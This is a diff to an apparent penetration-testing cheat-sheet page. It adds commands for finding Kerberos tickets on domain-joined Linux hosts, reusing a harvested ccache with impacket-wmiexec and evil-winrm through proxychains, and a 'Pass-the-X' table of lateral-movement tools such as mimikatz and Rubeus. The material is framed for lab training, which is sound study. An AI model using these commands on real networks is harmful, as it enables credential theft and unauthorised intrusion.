@@ -408,6 +408,23 @@ export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133</code></pre></div>
                     <div class="pc-node-body"><p>impacket-ticketConverter swaps a Linux ccache for a Windows .kirbi and back, so a ticket harvested on one platform works on the other. Linikatz is Mimikatz for UNIX: run as root, it extracts credentials and tickets from FreeIPA, SSSD, Samba and more into ccache/keytab files for reuse.</p><pre class="pc-cmd"><code>impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ./linikatz.sh</code></pre></div>
                   </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-pl-detect">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Is the host domain-joined?</span></summary>
+                    <div class="pc-node-body"><p>Confirm AD integration before hunting for tickets. realm list names the domain and the users and groups permitted to log in; if realm is absent, look for the sssd or winbind daemons running, and read KRB5CCNAME from the environment to see whether Kerberos is in use and where the cache lives.</p><pre class="pc-cmd"><code>realm list
+ps -ef | grep -iE &#39;sssd|winbind&#39;
+env | grep -i krb5</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-pl-tools">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Use the ticket with attack tools</span></summary>
+                    <div class="pc-node-body"><p>Linux AD tools take a ccache directly: set KRB5CCNAME to it and pass -k (and -no-pass if it prompts). Target by hostname, not IP, because Kerberos checks the service principal name. Impacket&#39;s exec tools and Evil-WinRM both speak Kerberos (Evil-WinRM needs the krb5-user package and a matching /etc/krb5.conf). From an attack host off the domain, proxy through the foothold with Chisel and proxychains and hardcode the DC in /etc/hosts so name resolution works.</p><pre class="pc-cmd"><code>export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
+impacket-wmiexec -k -no-pass dc01
+evil-winrm -i dc01 -r inlanefreight.htb
+proxychains impacket-wmiexec -k -no-pass dc01</code></pre></div>
+                  </details>
                 </li></ul>
               </li>
             </ul>
@@ -488,6 +505,30 @@ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local</code></pre></div>
             </ul>
           </li>
           </ol>
+        </section>
+        <section class="pc-ref" id="pcref-pass-the-x" aria-labelledby="pcref-pass-the-x-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-pass-the-x-title">Pass-the-X at a glance</h2>
+            <p class="pc-ref-intro">The lateral-movement family side by side: what you reuse, and the tools that do it. The full workflow for each is in the phases above. Filter by technique or tool.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-pass-the-x-q">Filter pass-the-x at a glance</label>
+            <input class="tool-input pc-ref-input" id="pcref-pass-the-x-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="pass-the-x" />
+            <span class="pc-ref-count" data-ref-count="pass-the-x" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="pass-the-x">
+              <thead><tr><th scope="col">Technique</th><th scope="col">What you pass</th><th scope="col">Key tools</th></tr></thead>
+              <tbody>
+                <tr data-search="pass-the-hash ntlm hash (unsalted, static) mimikatz, netexec -h, evil-winrm -h, impacket -hashes, xfreerdp /pth"><td>Pass-the-Hash</td><td>NTLM hash (unsalted, static)</td><td><code>mimikatz, netexec -H, evil-winrm -H, impacket -hashes, xfreerdp /pth</code></td></tr>
+                <tr data-search="overpass-the-hash ntlm hash or kerberos key, for a tgt mimikatz sekurlsa::pth, rubeus asktgt"><td>OverPass-the-Hash</td><td>NTLM hash or Kerberos key, for a TGT</td><td><code>mimikatz sekurlsa::pth, Rubeus asktgt</code></td></tr>
+                <tr data-search="pass-the-key rc4 / aes kerberos key rubeus asktgt /aes256, mimikatz"><td>Pass-the-Key</td><td>rc4 / aes Kerberos key</td><td><code>Rubeus asktgt /aes256, mimikatz</code></td></tr>
+                <tr data-search="pass-the-ticket kerberos ticket (.kirbi / ccache) rubeus ptt, mimikatz kerberos::ptt, impacket -k"><td>Pass-the-Ticket</td><td>Kerberos ticket (.kirbi / ccache)</td><td><code>Rubeus ptt, mimikatz kerberos::ptt, impacket -k</code></td></tr>
+                <tr data-search="pass-the-certificate x.509 certificate (.pfx) gettgtpkinit, certipy, passthecert"><td>Pass-the-Certificate</td><td>X.509 certificate (.pfx)</td><td><code>gettgtpkinit, certipy, PassTheCert</code></td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="pass-the-x" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
         </section>
         <section class="pc-ref" id="pcref-lazagne-modules" aria-labelledby="pcref-lazagne-modules-title">
           <div class="pc-ref-head">
